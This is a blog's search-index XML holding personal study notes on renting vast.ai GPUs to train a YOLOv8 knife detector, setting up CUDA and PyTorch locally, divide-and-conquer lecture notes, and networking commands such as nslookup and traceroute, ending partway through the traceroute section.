<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vastai remotely yolo</title>
      <link href="/2025/04/07/Python/vastai-remotely-yolo/"/>
      <url>/2025/04/07/Python/vastai-remotely-yolo/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#背景">背景</a></li><li><a href="#放弃国内算力平台">放弃国内算力平台</a></li><li><a href="#选择国外算力平台vastai">选择国外算力平台vastai</a><ul><li><a href="#注册账号">注册账号</a></li><li><a href="#选购gpu">选购GPU</a></li><li><a href="#通过jupyterlab连接实例">通过JupyterLab连接实例</a></li></ul></li><li><a href="#开始训练">开始训练</a><ul><li><a href="#摆好yolo的训练姿势">摆好yolo的训练姿势</a><ul><li><a href="#datayaml">data.yaml</a></li><li><a href="#train_yolopy">train_yolo.py</a></li></ul></li><li><a href="#使用screen让训练后台运行">使用screen让训练后台运行</a></li></ul></li></ul><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>本文记录租用云平台算力进行训练，减轻本机使用显卡的load。由于笔记本本身显卡能耗受限、散热不佳、显存受限等问题，我个人建议尽量避免笔记本overload。</p><p>关于如何使用云平台进行训练，需要具备cuda、Linux、yolo的一些知识。</p><p>此处以vastai平台使用yolov8训练模型为例。</p><h1 id="放弃国内算力平台"><a href="#放弃国内算力平台" class="headerlink" title="放弃国内算力平台"></a>放弃国内算力平台</h1><p>此时我在国外，最开始选择了国内算力平台“智星云”（<a href="https://gpu.ai-galaxy.cn/），但是很快发现一些网络问题。服务器并非具备独立IP，只是VPS向外映射SSH或RDP端口做了内网穿透，不知是否是GFW问题导致网络非常卡顿、RDP断断续续问题。因为无法解决比较快速的上传训练文件（2.5GB）左右，且其下载国外服务器文件速度过慢，遂放弃。">https://gpu.ai-galaxy.cn/），但是很快发现一些网络问题。服务器并非具备独立IP，只是VPS向外映射SSH或RDP端口做了内网穿透，不知是否是GFW问题导致网络非常卡顿、RDP断断续续问题。因为无法解决比较快速的上传训练文件（2.5GB）左右，且其下载国外服务器文件速度过慢，遂放弃。</a></p><h1 id="选择国外算力平台vastai"><a href="#选择国外算力平台vastai" class="headerlink" title="选择国外算力平台vastai"></a>选择国外算力平台vastai</h1><p>此处以vastai为例 <a href="https://cloud.vast.ai/">https://cloud.vast.ai/</a></p><h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>使用Google账号就可以登陆网站</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-09-29.png" alt></p><p>需要将右侧的四个要求解决才可以完成租赁。</p><p>验证邮箱</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-09-49.png" alt></p><p>选择template，此处选择现成的pytorch。点击torch下面那个小播放键 就选择了。</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-10-26.png" alt></p><p>把磁盘拉到50GB及以上，磁盘太小一般很容易出现杂七杂八的问题，因此disk不要小的太极限。</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-10-41.png" alt></p><p>充钱，略。</p><h2 id="选购GPU"><a href="#选购GPU" class="headerlink" title="选购GPU"></a>选购GPU</h2><p>最后选择具体的GPU rent.</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-10.png" alt></p><p>此处<strong>注意</strong>，<strong>很多GPU实例其实运行不起来</strong>。该平台本质是创建GPU直连的docker容器，注意检查日志是否有报错，有报错的实例直接删除就可以了。</p><p>只能过滤出来自己希望使用的显卡，然后一个一个试（不用担心试太多容器会花钱，他这没跑起来的容器不花钱），知道观察到这个按钮是<strong>Connecting</strong>, <strong>Open</strong>说明这个实例可以用起来。</p><p>如下，RTX5090,显存32GB：</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-46.png" alt></p><p>如图所示，确实可以运行：</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-11-57.png" alt></p><h2 id="通过JupyterLab连接实例"><a href="#通过JupyterLab连接实例" class="headerlink" title="通过JupyterLab连接实例"></a>通过JupyterLab连接实例</h2><p>点自己实例的Open按钮（此处我没有试成功直接的SSH连接）</p><p>Open后跳转的页面的这两个Application可以完成的文件上传下载、修改代码、执行shell。</p><p>我习惯点<strong>Jupyter Terminal</strong> 然后点开 <strong>Jupyter Lab</strong>.</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-28.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-34.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-12-43.png" alt></p><p>此处可以轻易的通过拖拽来文件IO（速度很快），也可以通过terminal运行shell。上传下载文件的时间你大概出去吃一顿饭。比如这24GB的文件费了大概半个小时。</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-08.png" alt></p><p>有能调用CUDA的torch</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-31.png" alt></p><p>可以看到RTX4090的24G的显存，满功耗450W（我这里用另一个实例跑yolo任务）</p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-13-55.png" alt></p><h1 id="开始训练"><a href="#开始训练" class="headerlink" title="开始训练"></a>开始训练</h1><p>pip缺什么库自己补全：如<code>pip install ultralytics</code></p><h2 id="摆好yolo的训练姿势"><a href="#摆好yolo的训练姿势" class="headerlink" title="摆好yolo的训练姿势"></a>摆好yolo的训练姿势</h2><p>图片、label依次放入如下目录：</p><pre><code>/workspace/xraytolishun/OPIXray/test/images/workspace/xraytolishun/OPIXray/test/labels/workspace/xraytolishun/OPIXray/train/images/workspace/xraytolishun/OPIXray/train/labels</code></pre><h3 id="data-yaml"><a href="#data-yaml" class="headerlink" title="data.yaml"></a>data.yaml</h3><pre><code># 图片路径train: /workspace/xraytolishun/OPIXray/trainval: /workspace/xraytolishun/OPIXray/test# 类别信息nc: 5names: [&quot;Folding_Knife&quot;, &quot;Straight_Knife&quot;, &quot;Scissor&quot;, &quot;Utility_Knife&quot;, &quot;Multi-tool_Knife&quot;]</code></pre><h3 id="train-yolo-py"><a href="#train-yolo-py" class="headerlink" title="train_yolo.py"></a>train_yolo.py</h3><pre><code>from ultralytics import YOLOimport argparseimport randomimport numpy as npimport torchimport osimport yamldef main():    parser = argparse.ArgumentParser()    parser.add_argument(&#39;--data&#39;, type=str, default=&#39;data.yaml&#39;, help=&#39;数据配置文件&#39;)    parser.add_argument(&#39;--epochs&#39;, type=int, default=200, help=&#39;训练轮次&#39;) # 改成200    parser.add_argument(&#39;--patience&#39;, type=int, default=50, help=&#39;早停耐心值&#39;)    parser.add_argument(&#39;--batch&#39;, type=int, default=16, help=&#39;批量大小&#39;) # -1改16    parser.add_argument(&#39;--imgsz&#39;, type=int, default=640, help=&#39;图像大小&#39;)    parser.add_argument(&#39;--weights&#39;, type=str, default=&#39;yolov8m.pt&#39;, help=&#39;预训练权重&#39;)    parser.add_argument(&#39;--device&#39;, type=str, default=&#39;0&#39;, help=&#39;训练设备，例如cuda设备索引&#39;)    parser.add_argument(&#39;--name&#39;, type=str, default=&#39;train&#39;, help=&#39;训练结果的保存名称&#39;)    args = parser.parse_args()    # 设置随机种子以提高实验可重复性    seed = 42    random.seed(seed)    np.random.seed(seed)    torch.manual_seed(seed)    torch.cuda.manual_seed(seed)    # 加载模型    model = YOLO(args.weights)    # 创建一个临时的数据配置文件，添加类别权重    # 从原始数据配置文件读取内容，指定UTF-8编码    try:        with open(args.data, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:            data_config = yaml.safe_load(f)    except UnicodeDecodeError:        # 如果UTF-8失败，尝试其他编码        with open(args.data, &#39;r&#39;, encoding=&#39;latin-1&#39;) as f:            data_config = yaml.safe_load(f)    # 添加类别权重 - 为直刀类别(索引1)设置2倍权重    nc = data_config.get(&#39;nc&#39;, 0)    if nc &gt;= 2:  # 确保有足够的类别        class_weights = [1.0] * nc        class_weights[1] = 2.0  # 将直刀类别(索引1)的权重设为2.0        data_config[&#39;class_weights&#39;] = class_weights    # 保存临时数据配置文件    temp_data_file = f&quot;temp_&#123;args.name&#125;_data.yaml&quot;    with open(temp_data_file, &#39;w&#39;, encoding=&#39;utf-8&#39;) as f:        yaml.dump(data_config, f)    # 自定义训练配置，减少内存占用    results = model.train(        data=temp_data_file,  # 使用带有类别权重的临时数据文件        epochs=args.epochs,        patience=args.patience,        batch=args.batch,        imgsz=args.imgsz,        device=args.device,        name=args.name,        seed=seed,        resume=False,        # 调整数据增强参数 - 降低内存使用        hsv_h=0.1,        hsv_s=0.7,        hsv_v=0.4,        degrees=20.0,        translate=0.2,        scale=0.5,        fliplr=0.5,        mosaic=1.0,  # 保持马赛克增强        mixup=0.3,  # 降低mixup概率，减少内存使用        copy_paste=0.0,  # 禁用copy-paste，减少内存使用        # 优化器和学习率设置        lr0=0.001,  # 略微提高初始学习率        lrf=0.01,  # 调整最终学习率因子        warmup_epochs=3,  # 减少预热轮次        warmup_momentum=0.8,        warmup_bias_lr=0.1,        # 损失权重调整 - 增强对直刀类别的关注        box=7.5,        cls=0.7,  # 略微增加分类损失权重        dfl=1.5,        # 其他原始参数        close_mosaic=10,  # 最后10个epoch关闭mosaic，提高稳定性        fraction=1.0,        cache=False,        optimizer=&#39;auto&#39;,        weight_decay=0.001,        val=True    )    # 删除临时数据文件    if os.path.exists(temp_data_file):        os.remove(temp_data_file)    # 验证训练好的模型    best_weights_path = f&#39;runs/detect/&#123;args.name&#125;/weights/best.pt&#39;    # 确保目录存在    os.makedirs(os.path.dirname(best_weights_path), exist_ok=True)    if os.path.exists(best_weights_path):        print(f&quot;使用最佳权重 &#123;best_weights_path&#125; 进行验证&quot;)        trained_model = YOLO(best_weights_path)        trained_model.val(data=args.data)    else:        print(f&quot;警告: 找不到最佳权重文件 &#123;best_weights_path&#125;&quot;)    print(&quot;训练过程完成。&quot;)if __name__ == &quot;__main__&quot;:    main()(main)</code></pre><h2 id="使用screen让训练后台运行"><a href="#使用screen让训练后台运行" class="headerlink" title="使用screen让训练后台运行"></a>使用screen让训练后台运行</h2><p>如果你知道SSH会话一断，相关的子进程都不会运行。</p><p>此处我们需要后台训练，因为时间耗费比较长，我们也可能关掉基于WEB的SSH会话。</p><pre><code>apt install screen</code></pre><p>创建yolo会话</p><pre><code>screen -S yolo</code></pre><p>现在就进入yolo的screen了。</p><p>将标准输出、错误输出，定向到》./log 文件，方便我们未来查看当前yolo运行到什么程度了：</p><pre><code>python train.py &gt; ./log.txt 2&gt;&amp;1</code></pre><p>完成后 <strong>ctrl+A + D (顺序按下)</strong>退出当前screen。</p><p>如果想切回之前的yolo的screen会话：</p><p>screen -ls 查看screen的后台会话</p><pre><code>(main) root@C.19270554:/workspace$ screen -lsThere is a screen on:        1911.yolo       (04/07/25 07:49:53)     (Detached)1 Socket in /run/screen/S-root.</code></pre><p><code>Screen -r 1911.yolo</code> 切回输入命令的会话。</p><p>查看日志：（不需要进入screen会话），直接查看文件即可：tail命令可以查看这个日志</p><pre><code>tail -f ./log.txt</code></pre><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-17-03.png" alt></p><p><img src="/2025/04/07/Python/vastai-remotely-yolo/2025-04-07-19-17-13.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>local yolo envir</title>
      <link href="/2025/04/07/Python/local-yolo-envir/"/>
      <url>/2025/04/07/Python/local-yolo-envir/</url>
      
        <content type="html"><![CDATA[<h1 id="创建python12解释器"><a href="#创建python12解释器" class="headerlink" title="创建python12解释器"></a>创建python12解释器</h1><pre><code>conda create -n py12 python=3.12</code></pre><p>根据提示将解释器目录从conda/envs/py12目录复制到COMP9517目录</p><h1 id="安装yolo依赖"><a href="#安装yolo依赖" class="headerlink" title="安装yolo依赖"></a>安装yolo依赖</h1><p>pyproject.toml 中存储有py项目依赖信息</p><p>C:\Users\amber\Desktop\COMP9517目录下cmd执行命令</p><pre><code>C:\Users\amber\Desktop\COMP9517\py12\python.exe -m pip install .</code></pre><h1 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h1><p>我们肯定选择GPU版本，否则训练图片若CPU，时间太长</p><p><a href="https://pytorch.org/">https://pytorch.org/</a></p><p>我们的cuda是12.4所以直接用pip方式弄</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-06.png" alt></p><p>执行命令</p><pre><code>C:\Users\amber\Desktop\COMP9517\py12\python.exe -m pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124</code></pre><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-22.png" alt></p><p>安装完后确认下torch是否调用显卡：完美</p><pre><code>&gt;&gt;&gt; import torch&gt;&gt;&gt; print(&quot;CUDA is available:&quot;, torch.cuda.is_available())CUDA is available: True</code></pre><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-36.png" alt></p><h1 id="安装cuda"><a href="#安装cuda" class="headerlink" title="安装cuda"></a>安装cuda</h1><p>nvidia control panel说我本机显卡版本12.5.85</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-21-56.png" alt></p><p>又因为pytorch官方说cuda 12.4比较合适</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-22-08.png" alt></p><p>所以安装cuda我要12.4</p><p>cuda12.4下载链接</p><p><a href="https://developer.nvidia.com/cuda-12-4-0-download-archive?target_os=Windows&amp;target_arch=x86_64&amp;target_version=11&amp;target_type=exe_local">https://developer.nvidia.com/cuda-12-4-0-download-archive?target_os=Windows&amp;target_arch=x86_64&amp;target_version=11&amp;target_type=exe_local</a></p><p>安装到 D:\cuda12\</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-22-33.png" alt></p><p>安装完毕</p><p>新打开一个cmd</p><p>执行命令</p><pre><code>nvidia-smiNVCC –version</code></pre><p>可以看到显卡可以正常被调用了</p><p>这里说cuda version是12.5,有点奇怪，因为我们安装的是12.4。如果之后安装pytorch不影响使用，这个小问题就忽略。</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-00.png" alt></p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-06.png" alt></p><h1 id="使用yolo训练图片"><a href="#使用yolo训练图片" class="headerlink" title="使用yolo训练图片"></a>使用yolo训练图片</h1><p>首先确认，我们电脑只有一个显卡目前，device号是0</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-19.png" alt></p><p>yolo.exe的命令位置如下 C:\Users\amber\Desktop\COMP9517\py12\Scripts\yolo.exe</p><p>之后使用该命令直接绝对路径调用，直接把yolo命令写如bat文件</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-44.png" alt></p><p>然后cmd中运行这个bat命令</p><p><img src="/2025/04/07/Python/local-yolo-envir/2025-04-07-19-23-58.png" alt></p><h1 id="torch版本过高，换了一个低的"><a href="#torch版本过高，换了一个低的" class="headerlink" title="torch版本过高，换了一个低的"></a>torch版本过高，换了一个低的</h1><p>该死，失败</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk2-lec</title>
      <link href="/2025/02/26/COMP9101/wk2-lec/"/>
      <url>/2025/02/26/COMP9101/wk2-lec/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#problem-of-27-coins-within-a-counterfeit">problem of 27 coins, within a counterfeit</a><ul><li><a href="#solution">Solution</a></li></ul></li><li><a href="#binary-search">Binary search</a><ul><li><a href="#binary-search-extensions">Binary search extensions</a></li></ul></li><li><a href="#decision-problems-and-optimisation-problems">Decision problems and optimisation problems</a><ul><li><a href="#definition">Definition</a></li><li><a href="#problem-example-optimisation-problem-maximum-median">Problem: Example optimisation problem: Maximum Median</a><ul><li><a href="#related-problem">Related problem</a></li><li><a href="#algorithm-for-related-problem">Algorithm (for related problem)</a></li></ul></li></ul></li><li><a href="#merge-sort">Merge sort</a></li><li><a href="#examplecounting-the-number-of-inversions">Example:Counting The Number Of inversions</a></li></ul><hr><ol><li>Introductory Examples<br>1.1 Coin puzzle<br>1.2 Binary search<br>1.3 Merge sort<br>1.4 Quick sort<br>1.5 Divide and Conquer paradigm</li><li>Recurrences<br>2.1 Framework<br>2.2 Master Theorem</li><li>Integer Multiplication<br>3.1 Applying D&amp;C to multiplication of large integers<br>3.2 The Karatsuba trick</li><li>Convolutions<br>4.1 Polynomials<br>4.2 The Fast Fourier Transform</li><li>Puzzle</li></ol><hr><h1 id="problem-of-27-coins-within-a-counterfeit"><a href="#problem-of-27-coins-within-a-counterfeit" class="headerlink" title="problem of 27 coins, within a counterfeit"></a>problem of 27 coins, within a counterfeit</h1><p>We are given 27 coins of the same denomination; we know that one of them is counterfeit and that it is lighter than the others. Find the counterfeit coin by weighing coins on a pan balance only three times.</p><p><strong>Hint</strong></p><p>You can reduce the search space by a third in one weighing!</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-02-28-14-02-35.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-02-28-14-05-28.png" alt></p><p>This method is called “<strong>divide-and-conquer</strong>”.</p><p>We have already seen some prototypical “serious” algorithms designed using this method: <strong>binary search</strong>, <strong>merge sort</strong> and <strong>quicksort</strong>.</p><p>We’ll now review these algorithms from a divide-and-conquer perspective, and adapt them to solve problems.</p><h1 id="Binary-search"><a href="#Binary-search" class="headerlink" title="Binary search"></a>Binary search</h1><p>Steps:</p><ul><li><strong>Divide</strong>: Test the midpoint of the search range ($Θ(1)$)</li><li><strong>Conquer</strong>: Search one side of the midpoint recursively</li><li><strong>Combine</strong>: Pass the answer up the recursion tree (Θ(1))</li></ul><p>Recursion is $log_2 n$ levels deep, with a total of $Θ(1)$ time spent in each level.</p><p>Time complexity is $Θ(logn)$.</p><h2 id="Binary-search-extensions"><a href="#Binary-search-extensions" class="headerlink" title="Binary search extensions"></a>Binary search extensions</h2><p>Given an array A, sorted in non-decreasing order, and an integer x.</p><ul><li><p>Lower bound: find the smallest index i such that A[i] ≥ x.</p></li><li><p>Upper bound: find the largest index i such that A[i] ≤ x.</p></li><li><p>Equal range: find the range of indices $ℓ..r$ such that $A[ℓ] = … = A[r] = x$.</p></li></ul><h1 id="Decision-problems-and-optimisation-problems"><a href="#Decision-problems-and-optimisation-problems" class="headerlink" title="Decision problems and optimisation problems"></a>Decision problems and optimisation problems</h1><p><strong>Decision problems</strong></p><p>Questions of the form: “Given some input, is there an x which . . . ”</p><p>Answer is “Yes” or “No”.</p><p><strong>Optimisation problems</strong></p><ul><li><p>Questions of the form: “What is the smallest/largest x for which …”</p></li><li><p>Answer is an object, e.g., a set or a number.</p></li></ul><p>An optimisation problem is typically harder than the corresponding decision problem.</p><p>But we can sometimes use decision problems to help us solve optimisation problems.</p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>Recall that the median of an array is the <strong>middle value</strong> in sorted order.</p><p>For example, the <strong>median</strong> of [1,2,2,4,5] is 2.</p><h2 id="Problem-Example-optimisation-problem-Maximum-Median"><a href="#Problem-Example-optimisation-problem-Maximum-Median" class="headerlink" title="Problem: Example optimisation problem: Maximum Median"></a>Problem: Example optimisation problem: Maximum Median</h2><p>Ling has an array A consisting of 2n-1 integers, sorted from smallest to largest. Note that the median is initially A[n].</p><p>She wants her numbers to grow big and strong, so for each of the following $k$ days she adds 1 to one of her numbers.</p><p>At the end of the $k$ days, what is the largest possible median that her array can have?</p><p>Example</p><p>If the starting array is [1,2,2,4,5] and k=3, the maximum median is 4, achieved by adding 1 to the third number on the first two days and to any number on the last day.</p><p>Using all three increases on the third number does not make the median value 5.</p><h3 id="Related-problem"><a href="#Related-problem" class="headerlink" title="Related problem"></a>Related problem</h3><p>Given positive integers $t$ and $k$. Ling wants to know whether she can make the median of her numbers at least the target value $t$ (by adding $1$ to one of her numbers each day for $k$ days).</p><p>How do we get the median to at least t?</p><ul><li>Increase the middle value A[n] and everything after it to $t$;<br>nothing to do for any values that are $≥t$ already.</li></ul><p>Why might we fail?</p><ul><li>$t$ could be too big (relative to $k$). I.e. if $k$ is too small then we could run out of days.</li><li>Unused days are fine (so long as our array has at least 3 entries).</li></ul><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-26.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-49.png" alt></p><p><img src="/2025/02/26/COMP9101/wk2-lec/2025-03-01-20-36-33.png" alt></p><h3 id="Algorithm-for-related-problem"><a href="#Algorithm-for-related-problem" class="headerlink" title="Algorithm (for related problem)"></a>Algorithm (for related problem)</h3><script type="math/tex; mode=display">\sum_{i=n}^{2n-1} max(t-A[i],0)</script><p>If this value is $≤k$, report yes; otherwise report no.</p><p>This algorithm clearly runs in $O(n)$ in the worst case.</p><h1 id="Merge-sort"><a href="#Merge-sort" class="headerlink" title="Merge sort"></a>Merge sort</h1><p>Steps:</p><p><strong>Divide</strong>: Split the array into two equal parts $(Θ(1))$</p><p><strong>Conquer</strong>: Sort each part recursively</p><p><strong>Combine</strong>: Merge the two sorted subarrays $(Θ(n))$</p><p>Recursion is $log_2 n$ levels deep, with a total of $Θ(n)$ time spent in each level.</p><p>Time complexity is $Θ(nlogn)$.</p><h1 id="Example-Counting-The-Number-Of-inversions"><a href="#Example-Counting-The-Number-Of-inversions" class="headerlink" title="Example:Counting The Number Of inversions"></a>Example:Counting The Number Of inversions</h1>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>commands</title>
      <link href="/2025/02/24/COMP9331/commands/"/>
      <url>/2025/02/24/COMP9331/commands/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#ping">ping</a></li><li><a href="#nslookup">nslookup</a></li><li><a href="#traceroute">traceroute</a><ul><li><a href="#命令内容详解">命令内容详解</a></li></ul></li><li><a href="#telnet-obsolete">telnet (obsolete)</a></li><li><a href="#ssh">ssh</a></li><li><a href="#ifconfig">ifconfig</a></li><li><a href="#netstat">netstat</a></li><li><a href="#curl">curl</a></li></ul><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>The <strong>ping</strong> utility is used to check connectivity to a host (to check if a host’s operating and network connections are intact). A small packet is sent through the network to a particular IP address. This packet contains 64 bytes containing 56 data bytes and 8 bytes of protocol header information. The host that sent the packet waits (or ‘listens’) for a return packet. A valid return packet will be received if the connections are good and the target host is up. The <strong>ping</strong> can also measure the round trip time of a packet. We use the following forms of the command:</p><p>ping host</p><p>where the host is the name or IP address of a host. It only answers whether the connectivity to the host is OK or not.</p><p>ping -s packetsize host </p><p>Option -s packetsize specifies the number of data bytes to be sent. The default is 56 Bytes (Linux).</p><p>ping -i interval host </p><p>Option -i interval specifies the interval between sending ping requests. The default is one second.</p><h1 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h1><pre><code>nslookup www.telstra.com.au</code></pre><pre><code>z5541664@vx14:~/Desktop$ nslookup www.telstra.com.auServer:        129.94.242.2Address:    129.94.242.2#53Non-authoritative answer:www.telstra.com.au    canonical name = d2l3pjybjlbg0l.cloudfront.net.Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.87Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.86Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.83Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 18.67.110.103Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:7600:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:8800:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:f000:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:6200:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:1400:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:1e00:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:9a00:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:e000:17:876d:b540:93a1</code></pre><p>nslookup 129.94.208.2 是反向查询（Reverse DNS Lookup），即从 IP 地址查询对应的主机名（PTR 记录）。</p><p>返回的结果 bartok.orchestra.cse.unsw.EDU.AU. 是 129.94.208.2 这个 IP 地址的主机名，说明这个 IP 有一个 PTR 记录指向 bartok.orchestra.cse.unsw.EDU.AU.。</p><p>2.208.94.129.in-addr.arpa  前面ip为啥是反的，后面字符串是啥</p><p>这是因为 DNS 反向解析（Reverse DNS Lookup） 使用了一种特殊的域名格式，称为 PTR 记录（Pointer Record），它用于将 IP 地址映射回主机名。</p><p>正常的 IP 地址</p><p>129.94.208.2</p><p>反向解析的格式</p><p>2.208.94.129.in-addr.arpa</p><p>IP 地址的各个八位组（octet）被倒序排列，然后添加 .in-addr.arpa 这个后缀。</p><p>DNS 解析是层级结构的，从右到左解析：</p><p>正向查询时，域名层级是 从右到左：</p><p>www.google.com</p><p>解析时，DNS 服务器先查 .com 顶级域名，再查 google.com，最后查 www.google.com。</p><p>反向查询时，IP 地址的层级是 从左到右：</p><p>129.94.208.2</p><p>129 是 A 类地址的网络号，最左边的部分最重要。</p><p>但 DNS 解析是从右到左，所以反向解析时，需要倒序排列 IP 地址的八位组。</p><p>PTR 记录（Pointer Record）详解</p><p>什么是 PTR 记录？</p><p>PTR（Pointer Record）记录是 DNS 反向解析（Reverse DNS Lookup） 中的一种 DNS 记录类型，它用于将 IP 地址映射回域名。</p><p>正向解析（A 记录）：把 域名解析为 IP</p><p>例如：</p><p>example.com -&gt; 93.184.216.34</p><p>反向解析（PTR 记录）：把 IP 解析为域名<br>例如：</p><p>93.184.216.34 -&gt; example.com</p><h1 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h1><p>The <strong>traceroute</strong> utility traces an IP packet’s route from your host to another Internet host. It shows how a host is physically connected to the Internet. Along the way, it gives an understanding of how networks interconnect. This network utility can also measure the round trip time between your host and the intermediate routers along the path.</p><p>The traceroute command is used to discover the routes packets take when travelling to their destination. The device (for example, a router or a PC) sends a sequence of User Datagram Protocol (UDP) datagrams to an invalid port address at the remote host. The default IP probe packet, which encapsulates the UDP datagram, is 40 bytes long.</p><p>Three UDP datagrams are sent, each with a Time-To-Live (TTL) field value set to one. The TTL value of 1 causes the datagram to “timeout” as soon as it hits the first router in the path; this router then responds with an ICMP Time Exceeded Message (TEM) indicating that the datagram has expired.</p><p>Another three UDP messages are now sent, each with the TTL value set to 2, which causes the second router to return ICMP TEMs. This process continues until the packets reach the destination. Since these datagrams are trying to access an invalid port at the destination host, ICMP Port Unreachable Messages are returned, indicating an unreachable port; this event signals the Traceroute program is finished.</p><p>The purpose is to record the source of each ICMP Time Exceeded Message to trace the path the packet took to reach the destination.</p><h2 id="命令内容详解"><a href="#命令内容详解" class="headerlink" title="命令内容详解"></a>命令内容详解</h2><p>traceroute host</p><pre><code>z5541664@vx14:~/Desktop$ traceroute www.telstra.com.autraceroute to www.telstra.com.au (18.67.110.86), 30 hops max, 60 byte packets 1  cserouter1-server.orchestra.cse.unsw.EDU.AU (129.94.242.251)  0.077 ms  0.084 ms  0.070 ms 2  unsw-gateway.orchestra.cse.unsw.EDU.AU (129.94.39.17)  0.477 ms  0.492 ms  0.490 ms 3  172.17.47.2 (172.17.47.2)  1.806 ms  1.472 ms  1.443 ms 4  172.17.17.9 (172.17.17.9)  0.923 ms 172.17.17.45 (172.17.17.45)  0.702 ms 172.17.17.9 (172.17.17.9)  1.243 ms 5  138.44.18.70 (138.44.18.70)  0.997 ms  1.222 ms 172.17.17.33 (172.17.17.33)  0.828 ms 6  ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.067 ms 138.44.18.70 (138.44.18.70)  0.973 ms ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.048 ms 7  * ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.971 ms * 8  * * * 9  * * *10  * * *11  * * *12  * * *13  15.230.149.4 (15.230.149.4)  1.679 ms  1.493 ms  1.467 ms14  * 15.230.149.5 (15.230.149.5)  1.658 ms  1.666 ms15  * * *16  * * *17  * * *18  * * *19  * * *20  * * *21  * * *22  * * *23  * * *24  * * *25  * * *26  * * *27  * * *28  * * *29  * * *30  * * *</code></pre><p><code>30 hops max, 60 byte packets</code>在说探测最大30跳，每个包携带60字节。</p><p>Hops 的英文全称是 “Hop Count”，其中 Hop 指的是数据包在网络中经过的一个路由器，而 Hop Count 指的是数据包从源头到目的地所经过的路由跳数。</p><p>在 traceroute 结果中，每一行的数字（如 7）表示当前数据包经过的 第几跳（hop）。</p><p>每行的<code>* * *</code>表示每个hop会发送3个探测包，发送方只需要设置TTL多少跳，然后等unreachable的响应。因此我们可以探测到，跳这么几下，能访问到的<strong>路由接口</strong>大概有哪些。</p><p>注意，路由接口不是路由器，你可以理解成和路由器上的多网卡相关，但是这不是我们关心的。tracerouter并不返回具体的哪个路由，辨别不了，但是会返回路由接口。</p><p>为什么会出现 *？</p><p>在 traceroute 结果中，每一行的格式是：</p><pre><code>跳数  响应时间1  响应时间2  响应时间3跳数  *  响应时间  